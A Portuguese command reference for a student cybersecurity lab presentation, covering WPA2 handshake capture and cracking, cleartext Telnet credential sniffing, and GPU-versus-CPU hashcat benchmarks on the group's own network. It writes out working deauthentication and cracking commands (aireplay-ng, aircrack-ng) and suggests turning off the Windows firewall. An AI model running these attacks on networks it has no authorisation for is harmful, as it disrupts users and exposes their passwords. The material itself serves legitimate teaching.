# 📋 REFERÊNCIA DE COMANDOS — Apresentação Final

**Projeto:** Hash Cracker Lab — Cibersegurança
**Grupo:** Henrique (Arch) · Ferro (Kali) · Francisco (Windows) · Duarte (Windows)
**Interface WiFi do Ferro:** `wlan00` → monitor mode: `wlan00mon`

---

## ⏱️ ORDEM DE EXECUÇÃO NA APRESENTAÇÃO

### FASE 0 — SETUP (antes de começar, ~5 min)

> Todos fazem isto **antes** de a apresentação começar.

**Henrique (Arch):**
```bash
cd ~/Projects/HashCrackerLab
source venv/bin/activate
python tools/validate_environment.py          # Confirmar tudo OK
hashcat -I                                    # Confirmar GPU detectada
python orchestrator.py --config config/quick_test.yaml  # Dry-run rápido (<30s)
```

**Ferro (Kali/Debian):**
```bash
cd ~/Projects/HashCrackerLab
source venv/bin/activate
iwconfig                                      # Confirmar wlan00 visível
sudo airmon-ng check kill                     # Matar processos que interferem
sudo airmon-ng start wlan00                   # Ativar modo monitor → wlan00mon
iwconfig wlan00mon                            # Confirmar "Mode:Monitor"
```

**Francisco (Windows):**
```powershell
cd C:\Users\Francisco\HashCrackerLab
.\.venv\Scripts\Activate.ps1
wireshark --version                           # Confirmar Wireshark instalado
```

**Duarte (Windows):**
```powershell
cd C:\Users\Duarte\HashCrackerLab
.\.venv\Scripts\Activate.ps1
```

---

### FASE 1 — WiFi WPA2 CRACKING (3:00–10:00)

> **Quem executa:** Ferro (Kali)
> **Quem narra:** Henrique

#### Passo 1 — Scan de redes (Ferro)
```bash
python wifi_cracker.py --scan-only --interface wlan00mon
```
**Output esperado:**
```
[+] N redes encontradas
    LAB-SERVERS              | AA:BB:CC:DD:EE:FF | Ch  6 | WPA2
```

#### Passo 2 — Capturar handshake (Ferro)
```bash
python wifi_cracker.py --capture --network "LAB-SERVERS" --interface wlan00mon
```
**O que acontece:** Escaneia → detecta LAB-SERVERS → lança airodump → envia deauth → captura handshake.

**Se o handshake não aparecer em 60s**, abrir **segundo terminal** e forçar deauth manual:
```bash
python wifi_cracker.py --deauth --network "LAB-SERVERS" --interface wlan00mon
```

**Output esperado:**
```
[+] HANDSHAKE CAPTURADO! → captures/handshake_LAB-SERVERS_XXXXXXXX.cap
```

#### Passo 3 — Crackar password (Ferro)
```bash
python wifi_cracker.py --crack captures/handshake_LAB-SERVERS_*.cap
```
**Output esperado:**
```
[*] Cracking WPA2 com aircrack-ng...
[+] PASSWORD ENCONTRADA: Cibersegura
```

#### Passo 3B — ALTERNATIVA: se handshake falhar, usar ficheiro pré-capturado
```bash
python wifi_cracker.py --crack hashes/wifi_sample.hc22000
```

---

### FASE 2 — TELNET CREDENTIAL CAPTURE (10:00–17:00)

> **Quem executa:** Francisco (servidor + Wireshark) + Duarte (cliente)
> **Quem narra:** Henrique

#### Passo 1 — Iniciar servidor Telnet (Francisco)
```powershell
python telnet_authenticated_traffic.py --server --target 0.0.0.0 --port 23
```
**Output esperado:**
```
[SERVER] Iniciando servidor Telnet Fake em 0.0.0.0:23...
[SERVER] Aguardando conexões...
```

#### Passo 2 — Iniciar captura no Wireshark (Francisco)
```
Abrir Wireshark → Selecionar interface Ethernet/WiFi
Filtro de captura: tcp.port == 23
Clicar: Start Capture (botão azul)
```

#### Passo 3 — Gerar tráfego autenticado (Duarte)
```powershell
python telnet_authenticated_traffic.py --target 192.168.100.30 --user admin --password SecurePass123 --verbose
```
**OU via telnet nativo (mais visual):**
```cmd
telnet 192.168.100.30 23
```
Depois escrever:
```
admin
SecurePass123
```

#### Passo 4 — Mostrar credenciais no Wireshark (Francisco)
```
No Wireshark: Follow → TCP Stream (clique direito num pacote Telnet)
→ Mostrar que "admin" e "SecurePass123" aparecem em texto claro!
```

#### Passo 5 — Gerar tráfego com múltiplas passwords (Duarte — opcional)
```powershell
python telnet_authenticated_traffic.py --target 192.168.100.30 --user duarte --password Cibersegura --hash-algo sha256 --count 5 --verbose
```

---

### FASE 3 — HASH CRACKING GPU vs CPU (17:00–27:00)

> **Quem executa:** Henrique (Arch)
> **Quem narra:** Henrique

#### Passo 1 — Executar experiência completa
```bash
python orchestrator.py --config config/apresentacao_final.yaml
```
**O que acontece:**
1. Gera 60 hashes (15 passwords × 4 algoritmos: MD5, SHA-256, Bcrypt, Argon2)
2. Executa 5 modos de ataque na GPU
3. Executa 5 modos de ataque no CPU
4. Gera tabela comparativa + relatório

**Output esperado (~2–3 min):**
```
[2/6] Gerando hashes...
[OK] 60 hashes gerados

[3/6] Executando cracking...
==================================================
Dispositivo: GPU
==================================================
[GPU] Processando 15 hashes md5...
  Modo: dictionary
  Modo: brute-force
  Modo: hybrid
...
==================================================
Dispositivo: CPU
==================================================
[CPU] Processando 15 hashes md5...
...

[4/6] Coletando métricas...
============================================================
RESUMO DE RESULTADOS
============================================================
Total de hashes: 60
Hashes crackeados: 32
Taxa de sucesso: 53.33%

Por Algoritmo:
+-----------+-------+------------+-------+
| Algoritmo | Total | Crackeados | Taxa  |
+-----------+-------+------------+-------+
| md5_gpu   |  15   |    10      | 66.7% |
| sha256_gpu|  15   |     9      | 60.0% |
| bcrypt_gpu|  15   |     7      | 46.7% |
| argon2_gpu|  15   |     6      | 40.0% |
+-----------+-------+------------+-------+
```

#### Passo 2 — Ver relatório gerado
```bash
LAST=$(ls -td results/*/ | head -1)
cat "$LAST/REPORT.md"
```

#### Passo 3 — Ver passwords crackeadas (demonstrar ao professor)
```bash
cat "$LAST/cracked/md5_gpu/cracked_md5_dictionary.pot"
cat "$LAST/cracked/sha256_gpu/cracked_sha256_dictionary.pot"
```

---

### FASE 4 — CONCLUSÕES (27:00–30:00)

> Só falar — sem comandos.

---

## 🛟 PLANO B — Se Algo Correr Mal

| Problema | Solução Imediata |
|----------|-----------------|
| `wlan00` não aparece em `iwconfig` | Desligar e voltar a ligar o adaptador USB |
| Handshake não captura | Usar ficheiro pré-capturado: `python wifi_cracker.py --crack hashes/wifi_sample.hc22000` |
| GPU não detectada | Editar YAML: `gpu.enabled: true`, `cpu.enabled: true` e correr só CPU |
| Wireshark sem tráfego | Verificar se Francisco está na mesma rede / usar `tcpdump -i any tcp port 23 -A` |
| Rede cai | Hash cracking funciona offline — correr só `orchestrator.py` |
| Import error Python | `pip install -r requirements.txt` |
| Argon2 timeout no CPU | Normal — explicar que isso prova o ponto |
| Hashcat erro OpenCL | `hashcat -I` → `sudo pacman -S opencl-nvidia` (Arch) |
| Telnet connection refused | Francisco verificar firewall: `netsh advfirewall set allprofiles state off` (temporário) |

---

## 📖 REFERÊNCIA COMPLETA DE TODOS OS COMANDOS

### wifi_cracker.py (Kali/Debian — Ferro)

```bash
# Scan — ver todas as redes WiFi ao alcance
python wifi_cracker.py --scan-only [--interface wlan00mon]

# Captura — scan + deauth + captura de handshake
python wifi_cracker.py --capture --network "LAB-SERVERS" [--interface wlan00mon] [--timeout 120] [--channel 6]

# Deauth — forçar desconexão de clientes (gera handshake)
python wifi_cracker.py --deauth --network "LAB-SERVERS" [--interface wlan00mon] [--deauth-count 5] [--deauth-rounds 3]
python wifi_cracker.py --deauth --bssid AA:BB:CC:DD:EE:FF [--interface wlan00mon]

# Crack — crackar handshake .cap com wordlist
python wifi_cracker.py --crack captures/handshake_LAB-SERVERS.cap [--wordlist wordlists/custom.txt]

# Pipeline completo — scan + capture + crack
python wifi_cracker.py --network "LAB-SERVERS" [--interface wlan00mon] [--wordlist wordlists/custom.txt]
python wifi_cracker.py --full --network "LAB-SERVERS"
```

**Parâmetros opcionais:**
| Flag | Default | Descrição |
|------|---------|-----------|
| `--interface` | `wlan00mon` | Interface em modo monitor |
| `--wordlist` | `wordlists/custom.txt` | Ficheiro de passwords |
| `--timeout` | `120` | Segundos para esperar pelo handshake |
| `--channel` / `-c` | auto | Canal WiFi do AP |
| `--output` | `captures` | Diretório para guardar ficheiros |
| `--bssid` | — | MAC do AP (auto-detectado pelo scan) |
| `--ssid` | — | Alias para `--network` |
| `--deauth-count` | `5` | Packets por ronda de deauth |
| `--deauth-rounds` | `3` | Número de rondas |

### orchestrator.py (Arch — Henrique)

```bash
# Teste rápido (<30s) — validar ambiente
python orchestrator.py --config config/quick_test.yaml

# Apresentação final (15 passwords × 4 algoritmos, CPU vs GPU)
python orchestrator.py --config config/apresentacao_final.yaml

# Mundo real (100 passwords, costs reais)
python orchestrator.py --config config/real_world.yaml

# Dry-run (validar config sem correr cracking)
python orchestrator.py --config config/apresentacao_final.yaml --dry-run
```

### telnet_authenticated_traffic.py (Windows — Francisco/Duarte)

```bash
# Modo SERVIDOR (Francisco) — escutar conexões
python telnet_authenticated_traffic.py --server --target 0.0.0.0 --port 23

# Modo CLIENTE simples (Duarte)
python telnet_authenticated_traffic.py --target 192.168.100.30 --user admin --password SecurePass123 --verbose

# Cliente com hash SHA-256 (demonstrar hash visível no Wireshark)
python telnet_authenticated_traffic.py --target 192.168.100.30 --user duarte --password Cibersegura --hash-algo sha256 --verbose

# Múltiplas conexões automáticas
python telnet_authenticated_traffic.py --target 192.168.100.30 --user duarte --password Cibersegura --count 5 --interval 2 --verbose

# Com wordlist (testar várias passwords)
python telnet_authenticated_traffic.py --target 192.168.100.30 --wordlist wordlists/custom.txt --verbose

# Ver instruções de Wireshark
python telnet_authenticated_traffic.py --show-instructions
```

### Utilitários

```bash
# Validar ambiente e dependências
python tools/validate_environment.py

# Limpar todos os resultados/capturas/logs
python tools/cleanup.py

# Verificar GPU (Hashcat)
hashcat -I

# Benchmark hashcat
hashcat -b -m 0       # MD5
hashcat -b -m 1400    # SHA-256
hashcat -b -m 3200    # Bcrypt
hashcat -b -m 34000   # Argon2

# Ver último relatório
LAST=$(ls -td results/*/ | head -1) && cat "$LAST/REPORT.md"
```

### Comandos aircrack-ng manuais (se necessário — Ferro)

```bash
# Matar processos que interferem com WiFi
sudo airmon-ng check kill

# Ativar modo monitor
sudo airmon-ng start wlan00

# Verificar modo monitor ativo
iwconfig wlan00mon

# Scan manual (sem Python)
sudo airodump-ng wlan00mon

# Scan filtrado por rede
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w captures/handshake wlan00mon

# Deauth manual
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan00mon

# Crack manual com aircrack-ng
sudo aircrack-ng -w wordlists/custom.txt -b AA:BB:CC:DD:EE:FF captures/handshake-01.cap

# Desativar modo monitor (após demonstração)
sudo airmon-ng stop wlan00mon
```

---

## 🖥️ IPs DA REDE

| Máquina | IP | Sistema | Função |
|---------|-----|---------|--------|
| Router | 192.168.100.1 | TP-Link Archer C20 | AP WiFi (LAB-SERVERS) |
| Henrique | 192.168.100.10 | Arch Linux | Orchestrator + GPU |
| Ferro | 192.168.100.20 | Kali/Debian | WiFi Cracking |
| Francisco | 192.168.100.30 | Windows | Telnet Server + Wireshark |
| Duarte | 192.168.100.40 | Windows | Telnet Client |
